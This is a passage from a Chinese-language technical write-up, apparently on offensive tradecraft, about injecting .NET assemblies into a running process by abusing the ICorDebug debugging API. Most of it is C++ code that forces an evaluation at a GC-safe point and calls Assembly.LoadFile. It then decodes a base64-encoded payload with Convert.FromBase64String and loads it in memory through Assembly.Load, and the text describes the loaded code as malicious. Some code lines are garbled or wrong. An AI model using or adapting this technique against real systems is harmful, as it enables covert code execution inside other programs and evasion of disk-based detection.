        stepAgain = true;
      }
    // Request a new string is created within the .NET process
      if (eval->NewString(L"C:\\test.dll") != S_OK)
      {
        // If we land here, chances are we aren't in a GC safe point, so we need 
        // to step again until we are
        stepAgain = true;
      }
    // If we were unable to create our string, we continue stepping until we can
      if (stepAgain) {
        pStepper->Step(0);
      } else {
      // If we were successful, we stop our stepper as we no longer require it
        pStepper->Deactivate();
      }
    // Continue our targets execution
      pAppDomain->Continue(false);
      return S_OK;
    }
在这里，只是尝试使用`ICorDebugEval::NewString`方法在目标进程内创建`System.String`
.NET对象。如果成功，可以确保我们处于GC安全点，这样就可以停止单步执行代码，而只要知道评估的代码可以工作，那就可以继续安全地执行应用程序。如果无法创建字符串，就要继续重试。
一旦我们能够成功执行该`ICorDebugEval::NewString`方法，接下来将等待调试器触发一个事件，该事件表明我们的评估已完成。这将通过API调用`ManagedCallback::EvalComplete`回调来完成。在这里，我们检索对创建的字符串的引用：
    HRESULT ManagedCallback::EvalComplete(ICorDebugAppDomain *pAppDomain, ICorDebugThread *pThread, ICorDebugEval *pEval)
    {
      // Will reference our System.String object
      ICorDebugValue *value;
    // Retreive our System.String object reference
      if (pEval->GetResult(&value) != S_OK)
      {
        return S_OK;
      }
    pAppDomain->Continue(false);
      return S_OK;
    }
将字符串对象存储在内存中之后，接下来需要将字符串传递给.NET的`Assembly.LoadFile`方法。同样，我们可以通过`ICorDebugEval`函数来完成此操作，但是首先需要检索对该方法的引用。为此，我们使用了另一个接口`IMetaDataImport`。这使我们能够从正在运行的进程中枚举一系列有用的信息，包括目标内可用的类型和方法。
首先，我们需要检索对.NET
`System.Reflection.Assembly`类的引用。为了简洁起见，我缩减了以下代码（完整的示例可以在文章结尾的POC中找到），但是检索类型引用看起来像这样：
    HRESULT Debugger::FindAssemblyByName(ICorDebugAssembly **assembly, std::vector *assemblies, std::wstring name)
    {
      ULONG32 inputLen = 1024;
      WCHAR assemblyName[1024];
      ULONG32 outputLen = 0;
    for (int i = 0; i size(); i++)
      {
        if (assemblies->at(i)->GetName(inputLen, &outputLen, assemblyName) == S_OK)
        {
          std::wstring asmName(assemblyName);
          if (asmName.find(name.c_str(), 0) != std::string::npos)
          {
            // We have found our target assembly
            *assembly = assemblies->at(i);
            return S_OK;
            }
          }
        }
        return E_FAIL;
      }
    ...
    if (Debugger::FindAssemblyByName(&assembly, assemblies, "mscorlib.dll") != S_OK) {
      return E_FAIL;
    }
    if (Debugger::GetModules(&modules, assembly) != S_OK) {
      return E_FAIL;
    }
    modules->at(0)->GetMetaDataInterface(IID_IMetaDataImport, (IUnknown**)&metadata);
    // Retrieve a reference to our type
    hr = metadata->FindTypeDefByName("System.Runtime.Assembly", NULL, &typeDef);
一旦有了对.NET类的引用，我们就需要找到对`LoadFile`方法的引用：
    if (!SUCCEEDED((hr = metadata->EnumMethods(&enumnum, typeDef, methodDefs, 1000, &count)))) {
      return E_FAIL;
    }
    for (auto methodDef : methodDefs)
    {
      // Retrieve information on this method
      metadata->GetMethodProps(methodDef, &typeDef, name, 1024, &nameLen, &flags, &sig, &sigLen, &rva, &implFlags);
      // See if this matches 
      if (wcsncmp(L"LoadFile", name, 8 + 1) == 0)
      {
        module->GetFunctionFromToken(methodDef, function);
        return S_OK;
      }
    }
    return E_FAIL;
最后，一旦有了目标引用，就可以直接将方法与我们的字符串参数一起调用：
    pEval->CallFunction(function, 1, &value);
此时，我们的代码将被加载并处于我们的目标进程中。剩下的就是从已加载的程序集中调用静态方法：
    ...
    Debugger::FindMethod(&function, pAppDomain, L"test.dll", L"testnamespace.testmethod", L"Entry");
    pEval->CallFunction(function, 0, NULL);
    …
如果一切顺利，我们将看到恶意代码已加载并且注入的代码正在运行：
当然，现在从磁盘加载利用代码并不是一种理想的技术，那么使用该`Assembly.Load`方法从内存加载该程序有多容易呢？好了，只要我们可以调用所需的任何.NET方法，然后对`ICorDebugEval`回调的处理进行一些调整，综合起来就可以加载payload了，经过base64编码的payload如下：
    // StepComplete Callback
    //
    // Load our Base64 encoded assembly string
    if ((hr = eval->NewString(BASE64_ENCODED_ASSEMBLY)) != S_OK)
    {
      pStepper->Step(0);
      return false;
    }
    ...
    // EvalComplete Callback 1
    //
    // Decode using System.Convert.FromBase64String
    if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Convert", L"FromBase64String", 0) != S_OK)
    {
      std::cout CallFunction(function, 1, &value);
    ...
    // EvalComplete Callback 2
    //
    // Use Assembly.Load to load our assembly in memory
    if (Debugger::FindMethod(&function, pAppDomain, L"mscorlib.dll", L"System.Reflection.Assembly", L"Load", 7) != S_OK)
    {
      std::cout << "[!] Fatal: Could not find method System.Reflection.Assembly.LoadFile in mscorlib.dll" << std::endl;
      exit(2);